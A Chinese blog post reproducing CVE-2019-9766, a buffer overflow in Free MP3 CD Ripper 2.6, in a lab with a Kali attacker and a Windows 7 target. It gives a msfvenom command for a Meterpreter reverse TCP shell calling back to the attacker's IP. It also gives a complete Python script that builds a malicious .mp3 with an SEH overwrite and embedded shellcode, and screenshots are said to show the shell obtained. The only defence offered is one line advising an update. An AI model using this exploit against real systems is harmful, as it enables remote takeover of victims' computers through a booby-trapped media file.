# Free MP3 CD Ripper_缓冲区溢出远程代码执行_CVE-2019-9766漏洞复现 - 雨中落叶 - 博客园

> 原文：[https://www.cnblogs.com/yuzly/p/11104805.html](https://www.cnblogs.com/yuzly/p/11104805.html)

Free MP3 CD Ripper_缓冲区溢出远程代码执行_CVE-2019-9766漏洞复现

**一、漏洞描述**

Free MP3 CD Ripper是一款音频格式转换器。Free MP3 CD Ripper 2.6版本中存在缓冲区溢出漏洞。远程攻击者可以借助特制的以.mp3为后缀的文件,利用该漏洞执行任意代码。

**二、漏洞影响版本**

Free MP3 CD Ripper 2.6

**三、漏洞复现环境搭建**

攻击机 kali    ip:192.168.10.136

靶机 win7 安装Free MP3 CD Ripper 2.6版本   ip:192.168.10.171

**四、漏洞复现**

1.kali利用msf生成反弹shellcode

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.136 lport=8888 -f c –smallest

　　![](../Images/0125b249b08d6f63e54db7e2216f6700.png)

2.构造具有反弹shell的MP3文件

2.1构造payload,然后把payload写入MP3格式的文件

#Stack-based buffer overflow in Free MP3 CD Ripper 2.6

```
buffer="A"*4116 NSEH="\xeb\x06\x90\x90" SEH="\x84\x20\xe4\x66" nops="\x90"*5 buf="" buf+="\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30" buf+="\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff" buf+="\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52" buf+="\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1" buf+="\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b" buf+="\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03" buf+="\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b" buf+="\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24" buf+="\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb" buf+="\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c" buf+="\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54" buf+="\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x0a\x88" buf+="\x68\x02\x00\x22\xb8\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50" buf+="\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5" buf+="\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0" buf+="\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8" buf+="\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00" buf+="\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68" buf+="\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3" pad="B"*(316-len(nops)-len(buf))
payload=buffer+NSEH+SEH+nops+buf+pad try:
    f=open("Test_Free_MP3.mp3","w")
    print "[+]Creating %s bytes mp3 Files..."%len(payload)
    f.write(payload)
    f.close()
    print "[+]mp3 File created successfully!" except:
print "File cannot be created!"
```

2.2然后运行脚本,生成mp3文件

　　![](../Images/df2285a425579fbe64ac15743e8a88d9.png)

3.把生成的mp3文件放到安装有Free MP3 CD Ripper 2.6的机器上

4.kali开启监听

　　![](../Images/9314a7a4cc99abdd9efd373013eb3cbf.png)

5.win7(靶机),利用Free MP3 CD Ripper打开mp3文件

　　![](../Images/0029d6374986fc04c4726e6225b5c9a0.png)

6.此时kali(攻击机已经获得shell)

　　![](../Images/a553071f82509accca0e9cb8523ac4c8.png)

**五、漏洞防御**

及时更新Free MP3 CD Ripper到最新版本